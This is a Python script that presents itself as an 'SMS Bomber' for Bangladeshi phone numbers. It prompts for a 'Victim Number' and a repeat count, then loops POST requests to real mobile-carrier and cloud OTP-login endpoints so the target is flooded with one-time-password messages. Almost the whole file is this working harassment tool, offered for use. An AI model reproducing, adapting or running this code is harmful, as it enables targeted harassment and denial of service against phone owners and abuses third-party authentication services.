
import os
import requests
import time
from requests.structures import CaseInsensitiveDict

#CVALUE
blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
line=yellow+"======================================================================================================================"
space=" "
logo=red+str("""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⣀⣤⣤⣀⣀
⠀⠀⢀⢀⢀⣠⣄⣦⣶⣶⣿⣿⣿⣿⣿⣿⣿⣶⡀
⠀⣤⣿⣾⣷⣿⠿⠿⠿⠿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣧⡀
⢸⣿⣿⡟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣿⣿⣿⣿⣄
⢹⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡿
⠈⢿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⡀⠀⢻⣿⡇
⠀⢸⣿⠀⠀⠀⢻⣿⣿⣶⣀⣀⣠⣾⣿⣿⣟⡉⠃⢸⣿
⠀⠈⢿⠀⠀⠼⠒⠿⣟⠟⠃⠀⠙⠿⣿⣿⣻⠿⠃⢸⡇
⠀⠀⢈⠀⠀⠀⠀⢉⣡⣤⣶⣶⣶⣤⣀⡉⠁⠀⠀⢸
⠀⠀⠘⢶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⡿
⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁
⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧
⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏
⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟
⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⠟                                                      
""")

      
 #HEADER                
text=cyan+"\t\tIf there is no error in life, there is no solution"+green+"\n\n\t\t🔥 Bombing Attack 🔥  \n" 
notice=""     
def header():
	print(logo)
	print(text)
	print(line)
	print(notice)
#SELECT_MAIN
def opt():
	print(cyan+"\n==> Select Your Option")
	print(yellow+"\n\n [1] Start Bombing (Bangladesh Number)\n\n [2] Back to Menu")
	

#MAIN_TOOL
os.system('clear')
tt=1
header()	
opt()
while tt<2:
	opt2=str(input(blue+"\n\n [>] Select Attack : "+yellow))
	if opt2=="1":
		text=cyan+"\t\tTOOL BY : NAHID ALAM"+green+"\n\n\t\tNahid Alam | BD SMS Bomber   \n" 
		os.system('clear')
		header()
		number=str(input(blue+"\n\n [>] Victim Number : "+yellow))
		ammount=int(input(blue+"\n [>] Threade : "+yellow))
		os.system('clear')
		notice=cyan+"\n\t   [•] 📲Sending sms......\n\n"
		header()
		ammount2=1
		totalsent=0
		totalnotsent=0
		while ammount2<ammount+1:
			try:
				if "yy" in number or "yyy" in number:
					r=requests.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request",data={"mobile":number})
						
				else:
					url=url = "https://0yzk2chfm3.execute-api.ap-southeast-1.amazonaws.com/prod/user/otp"
					headers=CaseInsensitiveDict()
					headers["Content-Type"]="application/json"
					datagp="""{\"mobile_number\":\"+88"""+number+"""\"}"""
					r=requests.post(url, headers=headers, data=datagp)
					
						
						
				if ammount2==1:
					print(cyan+"\n\t  🔥BOMBING-FIRE ➜   "+green+"[✓] 1st SMS Sent📲")
				elif ammount2==1:
					print(cyan+"\n\t  🔥BOMBING-FIRE ➜   "+green+"[✓] 2nd SMS Sent📲")
				elif ammount2==1:
					print(cyan+"\n\t  🔥BOMBING-FIRE ➜   "+green+"[✓] 3rd SMS Sent📲")
				else:
					print(cyan+"\n\t  🔥BOMBING-FIRE ➜   "+green+"[✓] "+str(ammount2)+"th SMS Sent.")
				time.sleep(1)
				totalsent+=1
				ammount2+=1
			except:
				if ammount2==1:
					print(cyan+"\n\t  ❌error-404❌   "+red+"[×] 1st SMS Not Sent⚠️")
				elif ammount2==2:
					print(cyan+"\n\t  ❌error-404❌   "+red+"[×] 2nd SMS Not Sent⚠️")
				elif ammount2==3:
					print(cyan+"\n\t  ❌error-404❌   "+red+"[×] 3rd SMS Not Sent⚠️")
				else:
					print(cyan+"\n\t  ❌error-404❌   "+red+"[×] "+str(ammount2)+"th SMS Not Sent.")
					time.sleep(10)
					ammount2+=1
									
								
		totalhit=ammount2-1
		totalnotsent=totalhit-totalsent
		print(cyan+"\n\n\t\t[•] Total Hits : "+yellow+str(totalhit))
		print(green+"\n\t\t[✓] Total Sent : "+yellow+str(totalsent))
		print(red+"\n\t\t[×] Total Not Sent : "+yellow+str(totalnotsent)+"\n")
		lastt=str(input(cyan+"\n\n\t\t  [✓] All Done!\n\t [•] Now Press Enter Key To Continue\n"))
		os.system('clear')
		notice=""
		text=green+"\n\n\t\t★★★Nahid Alam★★★   \n" 
		header()
		opt()
	
			
	elif opt2=="2":
		os.system("python3 main2.py")
	else:
		text=cyan+"\t\tTOOL BY : NAHID ALAM"+green+"\n\n\t\tNahid Alam | SMS Bomber   \n" 
		notice=red+"\n\t\t[×] Wrong Value Entered"
		os.system('clear')
		header()
		opt()
		continue
